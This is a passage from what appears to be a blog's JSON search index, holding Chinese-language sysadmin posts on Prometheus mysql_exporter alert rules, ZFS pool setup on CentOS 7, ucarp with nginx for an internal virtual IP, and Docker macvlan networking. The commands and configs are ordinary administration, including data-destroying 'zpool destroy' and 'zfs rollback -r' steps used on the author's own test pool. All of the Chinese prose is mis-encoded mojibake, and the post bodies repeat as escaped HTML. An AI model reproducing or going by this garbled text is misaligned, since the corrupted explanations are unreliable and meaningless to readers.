æ¯éš”5åˆ†é’Ÿä¼šè®¿é—®è¿™ä¸ªwebé¡µé¢ï¼ŒæŠŠä¸Šé¢çš„æ•°æ®æŠ“ä¸‹æ¥å…¥åº“ã€‚ï¼ˆæ—¶é—´é—´éš”å¯ä»¥è°ƒæ•´ï¼‰\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬ç‚¹è¿›Prometheusçš„é¡µé¢ï¼š\u003c/p\u003e\n\u003cp\u003eæ³¨æ„å³ä¸‹è§’çš„æ—¶é—´æˆ³æ˜¯ä¸å¯¹çš„ï¼Œå·®8å°æ—¶ï¼Œæˆ‘ä»¬ç‚¹å³ä¸Šè§’çš„React UI\n\u003cimg loading=\"lazy\" src=\"/posts/20231215-prometheus_mysql/2021-11-23_084815.png\"\u003e\u003c/p\u003e\n\u003cp\u003eè¿™ä¸ªUIæ—¶é—´æ˜¯å¯¹çš„ï¼Œè·Ÿå½“åœ°æ—¶é—´ä¸€è‡´ï¼š\n\u003cimg loading=\"lazy\" src=\"/posts/20231215-prometheus_mysql/2021-11-23_084907.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæƒ³çœ‹ mysql çš„æŒ‡æ ‡ï¼Œå°±éœ€è¦ç¼–è¾‘å…¬å¼ï¼Œè¾“å…¥mysqlä¼šæ˜¾ç¤ºæ‰€æœ‰mysqlçš„å…¬å¼ï¼š\n\u003cimg loading=\"lazy\" src=\"/posts/20231215-prometheus_mysql/2021-11-23_085033.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæ³¨æ„ï¼šæˆ‘ä»¬ mysql_exporter çš„ç«¯å£æ˜¯50001 ï¼Œ å†™ promsql é€‰æ‹©instanceçš„æ—¶å€™æ˜¯è¿™æ ·çš„instance=\u0026ldquo;172.18.20.9:50001\u0026rdquo;\u003c/p\u003e\n\u003cp\u003eç»™ä¸€äº›æŠ¥è­¦ä¾‹å­ï¼š\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003erate(mysql_global_status_threads_connected[5m]) \u0026gt; 200\r\n\r\nmysql_global_variables_max_connections - mysql_global_status_threads_connected \u0026lt; 500\r\n\r\nmysql_global_status_innodb_num_open_files \u0026gt; (mysql_global_variables_open_files_limit) * 0.75\n\u003c/code\u003e\u003c/pre\u003e","title":"Prometheusé›†æˆè¿›mysql_exporter"},{"content":"zfsç”¨æ¥é¡¶æ›¿Raidæ§åˆ¶å¡ï¼Œæœ‰ç›¸å½“å¼ºæ‚çš„æ€§èƒ½ï¼ŒTrueNASç”¨çš„å°±æ˜¯è¿™ç©æ„ã€‚\nå®˜æ–¹å®‰è£…æ–‡æ¡£ï¼š https://openzfs.github.io/openzfs-docs/Getting%20Started/RHEL%20and%20CentOS.html\nCentOS7å®‰è£…\nyum install -y epel-release\ryum install -y https://zfsonlinux.org/epel/zfs-release.el7_9.noarch.rpm\ryum install -y kernel-devel zfs åŠ è½½æ¨¡å—\n[root@localhost ~]# lsmod|grep zfs\r[root@localhost ~]# modprobe zfs\r[root@localhost ~]# lsmod|grep zfs\rzfs 3986850 0 zunicode 331170 1 zfs\rzlua 151525 1 zfs\rzcommon 89551 1 zfs\rznvpair 94388 2 zfs,zcommon\rzavl 15167 1 zfs\ricp 301854 1 zfs\rspl 104299 5 icp,zfs,zavl,zcommon,znvpair çœ‹çœ‹æ–‡ä»¶ç³»ç»Ÿ\n[root@localhost ~]# zfs list\rno datasets available 192.168.85.100çš„æœ¬åœ°ç£ç›˜ä»sdb ä¸€ç›´åˆ° sdgï¼Œé¦–å…ˆzpoolå»ºç«‹æ± å­ï¼Œç±»ä¼¼raidå¡çš„åŠŸèƒ½ ç„¶åå†zfså»ºç«‹æ–‡ä»¶ç³»ç»Ÿ\n[root@localhost ~]# zpool create -f zfspool sdb sdc sdd sde sdf sdg\r[root@localhost ~]# zpool status\rpool: zfspool\rstate: ONLINE\rscan: none requested\rconfig:\rNAME STATE READ WRITE CKSUM\rzfspool ONLINE 0 0 0\rsdb ONLINE 0 0 0\rsdc ONLINE 0 0 0\rsdd ONLINE 0 0 0\rsde ONLINE 0 0 0\rsdf ONLINE 0 0 0\rsdg ONLINE 0 0 0\rerrors: No known data errors\r[root@localhost ~]# df -h\ræ–‡ä»¶ç³»ç»Ÿ å®¹é‡ å·²ç”¨ å¯ç”¨ å·²ç”¨% æŒ‚è½½ç‚¹\rdevtmpfs 63G 0 63G 0% /dev\rtmpfs 63G 0 63G 0% /dev/shm\rtmpfs 63G 9.9M 63G 1% /run\rtmpfs 63G 0 63G 0% /sys/fs/cgroup\r/dev/mapper/centos-root 50G 1.7G 49G 4% /\r/dev/sda1 1014M 189M 826M 19% /boot\r/dev/mapper/centos-home 392G 33M 392G 1% /home\rtmpfs 13G 0 13G 0% /run/user/0\rzfspool 53T 128K 53T 1% /zfspool ä¸Šé¢å¯¹ç”Ÿäº§æ— æ„ä¹‰ï¼Œæ²¡æœ‰ä»»ä½•å†—ä½™çš„é…ç½®åœ¨ç”Ÿäº§æ˜¯è¡Œä¸é€šçš„\nç ´åæ‰å…ˆ\nzpool destroy zfspool æ¡å¸¦å¯¹æœºæˆ¿åŸºæœ¬æ— æ„ä¹‰ï¼Œåšmirror 1å³Raid1\n[root@localhost ~]# zpool create -f zfspool mirror sdb sdc\r[root@localhost ~]# zpool status\rpool: zfspool\rstate: ONLINE\rscan: none requested\rconfig:\rNAME STATE READ WRITE CKSUM\rzfspool ONLINE 0 0 0\rmirror-0 ONLINE 0 0 0\rsdb ONLINE 0 0 0\rsdc ONLINE 0 0 0\rerrors: No known data errors mirrorçš„è¯å¾€é‡Œé¢å¢åŠ ç›˜å¿…é¡»æˆå¯¹ï¼Œå•ç›˜ç¦æ­¢å¾€é‡Œé¢åŠ \n[root@localhost ~]# zpool add -f zfspool mirror sde\rinvalid vdev specification: mirror requires at least 2 devices å¢åŠ ä¸€å¯¹ç›˜è¿›å»ï¼Œè¿™æ ·å°±åšæˆRaid10äº†\n[root@localhost ~]# zpool add -f zfspool mirror sde sdf\r[root@localhost ~]# zpool status\rpool: zfspool\rstate: ONLINE\rscan: none requested\rconfig:\rNAME STATE READ WRITE CKSUM\rzfspool ONLINE 0 0 0\rmirror-0 ONLINE 0 0 0\rsdb ONLINE 0 0 0\rsdc ONLINE 0 0 0\rmirror-1 ONLINE 0 0 0\rsde ONLINE 0 0 0\rsdf ONLINE 0 0 0\rerrors: No known data errors å¦å¤–zfsæœ‰ä¸ªç‰¹æ®Šçš„raidz1 raidz2 raidz3 åˆ†åˆ«ä»£è¡¨å…è®¸1å—ç›˜åï¼Œ2å—ç›˜åï¼Œ3å—ç›˜å éœ€è¦çš„ç›˜æœ€å°æ•°é‡åˆ†åˆ«æ˜¯2å—ï¼Œ3å—ï¼Œ4å—\nåœ¨ç”Ÿäº§ï¼Œæ¯”è¾ƒé€‚åˆçš„æ˜¯å…è®¸2å—ç›˜åï¼Œå¹¶åŠ 1å—host spare\n[root@localhost /]# zpool create -f zfspool raidz2 sdb sdc sde sdf\r[root@localhost /]# zpool status\rpool: zfspool\rstate: ONLINE\rscan: none requested\rconfig:\rNAME STATE READ WRITE CKSUM\rzfspool ONLINE 0 0 0\rraidz2-0 ONLINE 0 0 0\rsdb ONLINE 0 0 0\rsdc ONLINE 0 0 0\rsde ONLINE 0 0 0\rsdf ONLINE 0 0 0\rerrors: No known data errors å¢åŠ çƒ­å¤‡ç›˜spare\n[root@localhost /]# zpool add zfspool spare sdg\r[root@localhost /]# zpool status\rpool: zfspool\rstate: ONLINE\rscan: none requested\rconfig:\rNAME STATE READ WRITE CKSUM\rzfspool ONLINE 0 0 0\rraidz2-0 ONLINE 0 0 0\rsdb ONLINE 0 0 0\rsdc ONLINE 0 0 0\rsde ONLINE 0 0 0\rsdf ONLINE 0 0 0\rspares\rsdg AVAIL errors: No known data errors å¦‚æœå‡ºç°åç›˜ï¼Œç”¨å¥½ç›˜sdfæ¢æ‰åç›˜sde\n[root@localhost /]# zpool replace zfspool sde sdf\r[root@localhost /]# zpool status\rpool: zfspool\rstate: ONLINE\rscan: resilvered 1.17M in 0 days 00:00:00 with 0 errors on Thu Mar 11 20:02:19 2021\rconfig:\rNAME STATE READ WRITE CKSUM\rzfspool ONLINE 0 0 0\rraidz2-0 ONLINE 0 0 0\rsdb ONLINE 0 0 0\rsdc ONLINE 0 0 0\rsdf ONLINE 0 0 0\rspares\rsdg AVAIL errors: No known data errors æ£€æŸ¥zpoolç£ç›˜ç»„çš„å®Œæ•´æ€§\nzpool scrub testpool å¢åŠ cacheä¼šå¢åŠ è¯»é€Ÿåº¦ï¼Œç±»ä¼¼ç›˜é˜µçƒ­ç‚¹SSDè‡ªåŠ¨è½ç›˜æŠ€æœ¯\n$ zpool create mirror /dev/sda /dev/sdb cache /dev/sdk /dev/sdl å¢åŠ logä¼šæé«˜å†™é€Ÿåº¦ï¼Œç±»ä¼¼ç›˜é˜µçƒ­ç‚¹SSDè‡ªåŠ¨è½ç›˜æŠ€æœ¯\n$ zpool create mirror /dev/sda /dev/sdb log /dev/sdk /dev/sdl zpool å»ºç«‹å¥½zfspoolåï¼Œå¯ä»¥å»ºæ–‡ä»¶ç³»ç»Ÿ\nzfs create zfspool/dba-vol\r[root@localhost /]# zfs list\rNAME USED AVAIL REFER MOUNTPOINT\rzfspool 1.47M 35.2T 153K /zfspool\rzfspool/dba-vol 262K 35.2T 160K /zfspool/dba-vol ä¿®æ”¹æŒ‚è½½ç‚¹\nzfs set mountpoint=/path/to/mount zpool-name/dataset-name å¿«ç…§\nzfs snapshot [pool]/[dataset name]@[snapshot name] zfs snapshot zfspool/dba-vol@dba-vol-20210315\rzfs list -t snapshot æ³¨æ„ï¼Œå¿«ç…§æ¢å¤åï¼Œè¯¥æ—¶é—´ç‚¹ä¹‹åçš„å¿«ç…§ä¼šå…¨éƒ¨ä¸¢å¤±\rzfs rollback -r [pool]/[dataset]@[snapshot name] zfs rollback -r zfspool/dba-vol@dba-vol-20210315 ","permalink":"https://rendoumi.com/posts/20231215-zfs_centos/","summary":"\u003cp\u003ezfsç”¨æ¥é¡¶æ›¿Raidæ§åˆ¶å¡ï¼Œæœ‰ç›¸å½“å¼ºæ‚çš„æ€§èƒ½ï¼ŒTrueNASç”¨çš„å°±æ˜¯è¿™ç©æ„ã€‚\u003c/p\u003e\n\u003cp\u003eå®˜æ–¹å®‰è£…æ–‡æ¡£ï¼š\n\u003ca href=\"https://openzfs.github.io/openzfs-docs/Getting%20Started/RHEL%20and%20CentOS.html\"\u003ehttps://openzfs.github.io/openzfs-docs/Getting%20Started/RHEL%20and%20CentOS.html\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eCentOS7å®‰è£…\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eyum install -y epel-release\r\nyum install -y https://zfsonlinux.org/epel/zfs-release.el7_9.noarch.rpm\r\nyum install -y kernel-devel zfs\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eåŠ è½½æ¨¡å—\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e[root@localhost ~]# lsmod|grep zfs\r\n\r\n[root@localhost ~]# modprobe zfs\r\n\r\n[root@localhost ~]# lsmod|grep zfs\r\nzfs                  3986850  0 \r\nzunicode              331170  1 zfs\r\nzlua                  151525  1 zfs\r\nzcommon                89551  1 zfs\r\nznvpair                94388  2 zfs,zcommon\r\nzavl                   15167  1 zfs\r\nicp                   301854  1 zfs\r\nspl                   104299  5 icp,zfs,zavl,zcommon,znvpair\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eçœ‹çœ‹æ–‡ä»¶ç³»ç»Ÿ\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e[root@localhost ~]#  zfs list\r\nno datasets available\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e192.168.85.100çš„æœ¬åœ°ç£ç›˜ä»sdb ä¸€ç›´åˆ° sdgï¼Œé¦–å…ˆzpoolå»ºç«‹æ± å­ï¼Œç±»ä¼¼raidå¡çš„åŠŸèƒ½\nç„¶åå†zfså»ºç«‹æ–‡ä»¶ç³»ç»Ÿ\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e[root@localhost ~]# zpool create -f zfspool sdb sdc sdd sde sdf sdg\r\n\r\n[root@localhost ~]# zpool status\r\n  pool: zfspool\r\n state: ONLINE\r\n  scan: none requested\r\nconfig:\r\n\r\n        NAME        STATE     READ WRITE CKSUM\r\n        zfspool     ONLINE       0     0     0\r\n          sdb       ONLINE       0     0     0\r\n          sdc       ONLINE       0     0     0\r\n          sdd       ONLINE       0     0     0\r\n          sde       ONLINE       0     0     0\r\n          sdf       ONLINE       0     0     0\r\n          sdg       ONLINE       0     0     0\r\n\r\nerrors: No known data errors\r\n\r\n[root@localhost ~]# df -h\r\næ–‡ä»¶ç³»ç»Ÿ                 å®¹é‡  å·²ç”¨  å¯ç”¨ å·²ç”¨% æŒ‚è½½ç‚¹\r\ndevtmpfs                  63G     0   63G    0% /dev\r\ntmpfs                     63G     0   63G    0% /dev/shm\r\ntmpfs                     63G  9.9M   63G    1% /run\r\ntmpfs                     63G     0   63G    0% /sys/fs/cgroup\r\n/dev/mapper/centos-root   50G  1.7G   49G    4% /\r\n/dev/sda1               1014M  189M  826M   19% /boot\r\n/dev/mapper/centos-home  392G   33M  392G    1% /home\r\ntmpfs                     13G     0   13G    0% /run/user/0\r\nzfspool                   53T  128K   53T    1% /zfspool\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eä¸Šé¢å¯¹ç”Ÿäº§æ— æ„ä¹‰ï¼Œæ²¡æœ‰ä»»ä½•å†—ä½™çš„é…ç½®åœ¨ç”Ÿäº§æ˜¯è¡Œä¸é€šçš„\u003c/p\u003e","title":"CentOS7å®‰è£…ZFS"},{"content":"ucarpæˆ‘ä»¬æ¥å®æˆ˜ä¸€ä¸‹å®Œæˆucarp+nginxåšå†…ç½‘vipï¼Œæ¨¡æ‹ŸF5çš„vipçš„æ–¹æ³•\nucarpçš„å®‰è£…å‚è€ƒä¹‹å‰çš„æ–‡ç« ï¼Œç¯å¢ƒå¦‚ä¸‹ï¼š\nucarp1ï¼š192.168.19.1 ucarp2ï¼š192.168.19.2 vipï¼š172.18.19.10 åœ¨172.18.19.1å’Œ172.18.19.2ä¸Šç¼–è¯‘Nginx 1.16.1\n./configure --prefix=/export/servers/nginx1161 --with-stream --with-stream_ssl_module make make install é‡ç‚¹æ˜¯/export/servers/nginx1161/conf/nginx.conf\ncat /export/servers/nginx1161/conf/nginx.conf user nobody; worker_processes auto; events { use epoll; worker_connections 65535; } stream { log_format proxy \u0026#39;$remote_addr [$time_local] \u0026#39; \u0026#39;$protocol $status $bytes_sent $bytes_received \u0026#39; \u0026#39;$session_time \u0026#34;$upstream_addr\u0026#34; \u0026#39; \u0026#39;\u0026#34;$upstream_bytes_sent\u0026#34; \u0026#34;$upstream_bytes_received\u0026#34; \u0026#34;$upstream_connect_time\u0026#34;\u0026#39;; } access_log logs/tcp-access.log proxy ; open_log_file_cache off; upstream stream_backend01 { hash $remote_addr consistent; #server 172.18.31.2:80 weight=5; server 172.18.31.2:80 max_fails=2 fail_timeout=30s; #server 172.18.31.2:80 max_conns=3; } server { listen 172.18.19.10:80; proxy_timeout 20s; proxy_pass stream_backend01; } } æ³¨æ„ï¼š 1ã€æ‰“å‡ºäº†tcp-access.log 2ã€æ ¹æ®æºIPåšhashï¼Œå¼ºåˆ¶åˆ†é…åˆ°åé¢çš„åŒä¸€å°æœåŠ¡å™¨ä¸Šï¼Œä¿è¯ä¸€è‡´æ€§ 3ã€åç«¯çš„serverå¯ä»¥æœ‰æƒé‡ï¼Œæœ€å¤§è¿æ¥ï¼Œä»¥åŠå¤±æ•ˆæ£€æµ‹ï¼ˆ30så†…æ— æ³•è¿é€š2æ¬¡ï¼Œå°±æ‘˜æ‰è¿™ä¸ªæœåŠ¡å™¨ï¼‰\nåŒæ—¶è°ƒæ•´vip-up.sh\ncat /usr/local/bin/vip-up.sh #!/bin/sh /sbin/ip addr add ${2}/24 dev ${1} /sbin/ip neigh flush dev ${1} /export/servers/nginx/sbin/nginx /export/servers/nginx/sbin/nginx -s reload è°è·å¾—äº†ä¸»ip 172.18.19.10ï¼Œè°å°±ä¼šå¯åŠ¨nginxï¼Œå¹¶ä¸”å¼ºåˆ¶åˆ·ä¸€ä¸‹é…ç½®\næ³¨æ„ï¼Œä¸€å¼€å§‹çš„æ—¶å€™ï¼Œç”±äº172.18.19.2æ²¡æœ‰è·å¾—ä¸»ip 172.18.19.10ï¼Œæ‰€ä»¥ä¸Šé¢æ˜¯ä¸ä¼šè‡ªåŠ¨èµ·nginxè¿›ç¨‹çš„ï¼ï¼ï¼\næµ‹è¯•ä¸€ä¸‹ï¼š\nåœ¨172.18.19.1ä¸Šé¢ kill -usr2 ucarpçš„è¿›ç¨‹pid çœ‹172.18.19.2ä¸Šé¢ï¼Œnginxå·²ç»è‡ªåŠ¨å¯åŠ¨äº† ç„¶åè®¿é—® curl http://172.18.19.10/ ok\n","permalink":"https://rendoumi.com/posts/20231214-ucarp_nginx/","summary":"\u003cp\u003eucarpæˆ‘ä»¬æ¥å®æˆ˜ä¸€ä¸‹å®Œæˆucarp+nginxåšå†…ç½‘vipï¼Œæ¨¡æ‹ŸF5çš„vipçš„æ–¹æ³•\u003c/p\u003e\n\u003cp\u003eucarpçš„å®‰è£…å‚è€ƒä¹‹å‰çš„æ–‡ç« ï¼Œç¯å¢ƒå¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eucarp1ï¼š192.168.19.1\u003c/li\u003e\n\u003cli\u003eucarp2ï¼š192.168.19.2\u003c/li\u003e\n\u003cli\u003evipï¼š172.18.19.10\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eåœ¨172.18.19.1å’Œ172.18.19.2ä¸Šç¼–è¯‘Nginx 1.16.1\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ./configure --prefix\u003cspan class=\"o\"\u003e=\u003c/span\u003e/export/servers/nginx1161 --with-stream --with-stream_ssl_module\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\tmake\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\tmake install\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eé‡ç‚¹æ˜¯/export/servers/nginx1161/conf/nginx.conf\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /export/servers/nginx1161/conf/nginx.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  user  nobody\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  worker_processes  auto\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  events \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    use epoll\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    worker_connections  65535\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  stream \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  log_format proxy \u003cspan class=\"s1\"\u003e\u0026#39;$remote_addr [$time_local] \u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e               \u003cspan class=\"s1\"\u003e\u0026#39;$protocol $status $bytes_sent $bytes_received \u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e               \u003cspan class=\"s1\"\u003e\u0026#39;$session_time \u0026#34;$upstream_addr\u0026#34; \u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e               \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#34;$upstream_bytes_sent\u0026#34; \u0026#34;$upstream_bytes_received\u0026#34; \u0026#34;$upstream_connect_time\u0026#34;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  access_log logs/tcp-access.log proxy \u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  open_log_file_cache off\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  upstream stream_backend01 \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003ehash\u003c/span\u003e \u003cspan class=\"nv\"\u003e$remote_addr\u003c/span\u003e consistent\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e#server 172.18.31.2:80 weight=5;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    server 172.18.31.2:80 \u003cspan class=\"nv\"\u003emax_fails\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e2\u003c/span\u003e \u003cspan class=\"nv\"\u003efail_timeout\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e30s\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e#server 172.18.31.2:80 max_conns=3;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  server \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        listen 172.18.19.10:80\u003cspan class=\"p\"\u003e;\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        proxy_timeout 20s\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        proxy_pass stream_backend01\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e   \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„ï¼š\n1ã€æ‰“å‡ºäº†tcp-access.log\n2ã€æ ¹æ®æºIPåšhashï¼Œå¼ºåˆ¶åˆ†é…åˆ°åé¢çš„åŒä¸€å°æœåŠ¡å™¨ä¸Šï¼Œä¿è¯ä¸€è‡´æ€§\n3ã€åç«¯çš„serverå¯ä»¥æœ‰æƒé‡ï¼Œæœ€å¤§è¿æ¥ï¼Œä»¥åŠå¤±æ•ˆæ£€æµ‹ï¼ˆ30så†…æ— æ³•è¿é€š2æ¬¡ï¼Œå°±æ‘˜æ‰è¿™ä¸ªæœåŠ¡å™¨ï¼‰\u003c/p\u003e","title":"Ucarpå’Œnginxæä¾›å†…ç½‘vip"},{"content":"åœ¨k8sæ²¡æœ‰å‡ºæ¥ä¹‹å‰ï¼Œæˆ‘ä»¬ç”¨çš„å°±æ˜¯LXCï¼Œå¤æ—©ç‰ˆæœ¬äº†ã€‚\nè·‘çš„LXCï¼ŒåŸºäºdockerè¿›è¡Œç®¡ç†ï¼Œç½‘ç»œéƒ¨åˆ†ç‹¬ç«‹ã€‚\nè¿›åŒ–åˆ°æ–°ç‰ˆæœ¬çš„Dockeråï¼Œç½‘ç»œéƒ¨åˆ†éœ€è¦ä¿®æ”¹ï¼Œæˆ‘ä»¬å†³å®šé‡‡ç”¨macvlanæ–¹å¼æ‰å¹³ç›´æ¥æ¥å…¥æœ¬åœ°ç½‘ç»œï¼š\nDockerè£…å¥½ä»¥åï¼Œç³»ç»Ÿä¸­ä¼šå‡ºç°ä¸€ä¸ªDocker0çš„ç½‘ç»œï¼Œç”¨æ¥NATï¼Œæˆ‘ä»¬ä¸ç”¨è¿™ä¸ª\n2: eth0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000 link/ether 52:54:00:14:ee:63 brd ff:ff:ff:ff:ff:ff inet 172.18.31.33/24 brd 172.18.31.255 scope global eth0 valid_lft forever preferred_lft forever 3: docker0: \u0026lt;NO-CARRIER,BROADCAST,MULTICAST,UP\u0026gt; mtu 1500 qdisc noqueue state DOWN group default link/ether 02:42:ef:af:de:98 brd ff:ff:ff:ff:ff:ff inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0 valid_lft forever preferred_lft forever æˆ‘ä»¬è¦åšçš„æ˜¯å¯¹eth0åšmacvlanï¼Œä¸åšä»»ä½•iptableï¼Œç›´æ¥æ¥å…¥æœ¬åœ°ç½‘ç»œ\nå®¿ä¸»æœºip: 172.18.31.33 Docker1: 172.18.31.35\nä¸€ã€å»ºmacvlan\ndocker network create -d macvlan \\ --subnet=172.18.31.0/24 --gateway=172.18.31.254 \\ -o parent=eth0 \\ macvlan0 docker network ls docker inspect macvlan0 ä¼šçœ‹åˆ°\n... \u0026#34;Config\u0026#34;: [ { \u0026#34;Subnet\u0026#34;: \u0026#34;172.18.31.0/24\u0026#34;, \u0026#34;Gateway\u0026#34;: \u0026#34;172.18.31.254\u0026#34; } ] äºŒã€æŒ‰æŒ‡å®šipå»ºç«‹å®¹å™¨\ndocker run --rm -dit --name=t35 --net macvlan0 --ip=172.18.31.35 alpine:latest ash éšåæˆ‘ä»¬å¯ä»¥ç”¨docker execå–å¾—shell\ndocker exec -it t35 ash ip a ping 172.18.31.35 ping 172.18.31.2 æ³¨æ„ï¼šè¿™ä¸ªæ—¶å€™ä»å®¿ä¸»æœºpingå®¹å™¨ ping 172.18.31.35ï¼Œæˆ–è€…æ˜¯ä»å®¹å™¨pingå®¿ä¸»æœº ping 